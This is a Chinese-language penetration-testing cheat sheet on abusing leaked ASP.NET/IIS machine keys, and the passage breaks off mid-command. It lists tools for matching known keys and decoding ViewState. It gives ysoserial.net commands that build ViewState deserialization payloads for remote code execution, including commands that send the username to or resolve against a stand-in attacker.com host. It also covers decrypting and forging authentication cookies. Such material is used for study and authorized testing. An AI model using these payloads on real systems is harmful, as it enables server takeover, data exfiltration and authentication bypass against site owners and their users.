# IIS 机器密钥

> 该机器密钥用于加密和解密表单身份验证 Cookie 数据和视图状态数据，并用于验证跨进程会话状态标识。

## 概要

* [视图状态格式](#viewstate-format)
* [机器密钥格式和位置](#machine-key-format-and-locations)
* [识别已知机器密钥](#identify-known-machine-key)
* [解码视图状态](#decode-viewstate)
* [生成用于 RCE 的视图状态](#generate-viewstate-for-rce)
    * [MAC 未启用](#mac-is-not-enabled)
    * [MAC 已启用且加密已禁用](#mac-is-enabled-and-encryption-is-disabled)
    * [MAC 已启用且加密已启用](#mac-is-enabled-and-encryption-is-enabled)
* [使用机器密钥编辑 Cookie](#edit-cookies-with-the-machine-key)
* [参考文献](#references)

## 视图状态格式

IIS 中的 ViewState 是一种技术，用于在 ASP.NET 应用程序中保留 Web 控件在回发之间的状态。它将数据存储在页面上的隐藏字段中，使页面能够维护用户输入和其他状态信息。

| 格式 | 属性 |
| --- | --- |
| Base64 | `EnableViewStateMac=False`,  `ViewStateEncryptionMode=False` |
| Base64 + MAC | `EnableViewStateMac=True` |
| Base64 + 加密 | `ViewStateEncryptionMode=True` |

默认情况下，直到 2014 年 9 月，`enableViewStateMac` 属性设置为 `False`。
通常未加密的 ViewState 以字符串 `/wEP` 开头。

## 机器密钥格式和位置

IIS 中的 machineKey 是 ASP.NET 中的一个配置元素，指定用于加密和验证数据（如视图状态和表单身份验证令牌）的加密密钥和算法。它确保了在 Web 应用程序之间的一致性和安全性，特别是在 Web 农场环境中。

machineKey 的格式如下。

```xml
<machineKey validationKey="[String]"  decryptionKey="[String]" validation="[SHA1 (default) | MD5 | 3DES | AES | HMACSHA256 | HMACSHA384 | HMACSHA512 | alg:algorithm_name]"  decryption="[Auto (default) | DES | 3DES | AES | alg:algorithm_name]" />
```

`validationKey` 属性指定一个十六进制字符串，用于验证数据，确保其未被篡改。

`decryptionKey` 属性提供一个十六进制字符串，用于加密和解密敏感数据。

`validation` 属性定义用于数据验证的算法，选项包括 SHA1、MD5、3DES、AES 和 HMACSHA256 等。

`decryption` 属性指定加密算法，选项包括 Auto、DES、3DES 和 AES，或者可以使用 alg:algorithm_name 指定自定义算法。

以下 machineKey 示例来自 [Microsoft 文档](https://docs.microsoft.com/en-us/iis/troubleshoot/security-issues/troubleshooting-forms-authentication)。

```xml
<machineKey validationKey="87AC8F432C8DB844A4EFD024301AC1AB5808BEE9D1870689B63794D33EE3B55CDB315BB480721A107187561F388C6BEF5B623BF31E2E725FC3F3F71A32BA5DFC" decryptionKey="E001A307CCC8B1ADEA2C55B1246CDCFE8579576997FF92E7" validation="SHA1" />
```

**web.config** / **machine.config** 的常见位置

* 32 位
    * `C:\Windows\Microsoft.NET\Framework\v2.0.50727\config\machine.config`
    * `C:\Windows\Microsoft.NET\Framework\v4.0.30319\config\machine.config`
* 64 位
    * `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\config\machine.config`
    * `C:\Windows\Microsoft.NET\Framework64\v2.0.50727\config\machine.config`
* 当启用 **AutoGenerate** 时位于注册表中（使用 [irsdl/machineKeyFinder.aspx](https://gist.github.com/irsdl/36e78f62b98f879ba36f72ce4fda73ab) 提取）
    * `HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\4.0.30319.0\AutoGenKeyV4`  
    * `HKEY_CURRENT_USER\Software\Microsoft\ASP.NET\2.0.50727.0\AutoGenKey`

## 识别已知机器密钥

尝试从已知产品、Microsoft 文档或其他互联网部分获取多个机器密钥。

* [isclayton/viewstalker](https://github.com/isclayton/viewstalker)

    ```powershell
    ./viewstalker --viewstate /wEPD...TYQ== -m 3E92B2D6 -M ./MachineKeys2.txt
    ____   ____.__                       __         .__   __
    \   \ /   /|__| ______  _  _________/  |______  |  | |  | __ ___________ 
    \   Y   / |  |/ __ \ \/ \/ /  ___/\   __\__  \ |  | |  |/ // __ \_  __ \
    \     /  |  \  ___/\     /\___ \  |  |  / __ \|  |_|    <\  ___/|  | \/
    \___/   |__|\___  >\/\_//____  > |__| (____  /____/__|_ \\___  >__|   
                    \/           \/            \/          \/    \/       

    KEY FOUND!!!
    Host:   
    Validation Key: XXXXX,XXXXX
    ```

* [blacklanternsecurity/badsecrets](https://github.com/blacklanternsecurity/badsecrets)

    ```ps1
    python examples/blacklist3r.py --viewstate /wEPDwUK...j81TYQ== --generator 3E92B2D6
    Matching MachineKeys found!
    validationKey: C50B3C89CB21F4F1422FF158A5B42D0E8DB8CB5CDA1742572A487D9401E3400267682B202B746511891C1BAF47F8D25C07F6C39A104696DB51F17C529AD3CABE validationAlgo: SHA1
    ```

* [NotSoSecure/Blacklist3r](https://github.com/NotSoSecure/Blacklist3r)

    ```powershell
    AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy
    ```

* [0xacb/viewgen](https://github.com/0xacb/viewgen)

    ```powershell
    $ viewgen --guess "/wEPDwUKMTYyOD...WRkuVmqYhhtcnJl6Nfet5ERqNHMADI="
    [+] ViewState 未加密
    [+] 签名算法：SHA1
    ```

一些有趣的机器密钥列表：

* [NotSoSecure/Blacklist3r/MachineKeys.txt](https://github.com/NotSoSecure/Blacklist3r/raw/f10304bc90efaca56676362a981d93cc312d9087/MachineKey/AspDotNetWrapper/AspDotNetWrapper/Resource/MachineKeys.txt)
* [isclayton/viewstalker/MachineKeys2.txt](https://raw.githubusercontent.com/isclayton/viewstalker/main/MachineKeys2.txt)
* [blacklanternsecurity/badsecrets/aspnet_machinekeys.txt](https://raw.githubusercontent.com/blacklanternsecurity/badsecrets/dev/badsecrets/resources/aspnet_machinekeys.txt)

## 解码视图状态

* [BApp Store > ViewState 编辑器](https://portswigger.net/bappstore/ba17d9fb487448b48368c22cb70048dc) - ViewState 编辑器是一个扩展，允许您查看和编辑 V1.1 和 V2.0 ASP 视图状态数据的结构和内容。
* [0xacb/viewgen](https://github.com/0xacb/viewgen)

    ```powershell
    viewgen --decode --check --webconfig web.config --modifier CA0B0334 "zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY="
    ```

## 生成用于 RCE 的视图状态

首先需要解码 Viewstate 以了解是否启用了 MAC 和加密。

**需求**:

* `__VIEWSTATE`
* `__VIEWSTATEGENERATOR`

### MAC 未启用

```ps1
ysoserial.exe -o base64 -g TypeConfuseDelegate -f ObjectStateFormatter -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/:UserName"
```

### MAC 已启用且加密已禁用

* 使用 `badsecrets`、`viewstalker`、`AspDotNetWrapper.exe` 或 `viewgen` 找到机器密钥（验证密钥）

    ```ps1
    AspDotNetWrapper.exe --keypath MachineKeys.txt --encrypteddata /wEPDwUKLTkyMTY0MDUxMg9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkbdrqZ4p5EfFa9GPqKfSQRGANwLs= --purpose=viewstate  --valalgo=sha1 --decalgo=aes --modifier=CA0B0334 --macdecode --legacy
    # --modifier = `__VIEWSTATEGENERATOR` 参数值
    # --encrypteddata = 目标应用程序的 `__VIEWSTATE` 参数值
    ```

* 然后使用 [pwntester/ysoserial.net](https://github.com/pwntester/ysoserial.net) 生成一个 ViewState，可以使用 `TextFormattingRunProperties` 和 `TypeConfuseDelegate` 小工具。

    ```ps1
    .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "powershell.exe Invoke-WebRequest -Uri http://attacker.com/:UserName" --generator=CA0B0334 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"
    .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "powershell.exe -c nslookup http://attacker.com" --generator=3E92B2D6 --validationalg="SHA1" --validationkey="C551753B0325187D1759B4FB055B44F7C5077B016C02AF674E8DE69351B69FEFD045A267308AA2DAB81B69919402D7886A6E986473EEEC9556A9003357F5ED45"

    # --generator = `__VIEWSTATEGENERATOR` 参数值
    # --validationkey = 上述命令中的验证密钥
    ```

### MAC 已启用且加密已启用

默认验证算法是 `HMACSHA256`，默认解密算法是 `AES`。

如果缺少 `__VIEWSTATEGENERATOR` 但应用程序使用的是 .NET Framework 版本 4.0 或更低版本，您可以使用应用的根目录（例如：`--apppath="/testaspx/"`）。

* **.NET Framework < 4.5**，ASP.NET 总是接受未加密的 `__VIEWSTATE`，前提是您从请求中删除 `__VIEWSTATEENCRYPTED` 参数。

    ```ps1
    .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "echo 123 > c:\windows\temp\test.txt" --apppath="/testaspx/" --islegacy --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" --isdebug
    ```

* **.NET Framework > 4.5**，machineKey 具有属性：`compatibilityMode="Framework45"`

    ```ps1
    .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "echo 123 > c:\windows\temp\test.txt" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --validationalg="HMACSHA256" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
    ```

## 使用机器密钥编辑 Cookie

如果您拥有 `machineKey` 但视图状态已禁用。

ASP.net 表单身份验证 Cookie：[liquidsec/aspnetCryptTools](https://github.com/liquidsec/aspnetCryptTools)

```powershell
# 解密 Cookie
$ AspDotNetWrapper.exe --keypath C:\MachineKey.txt --cookie XXXXXXX_XXXXX-XXXXX --decrypt --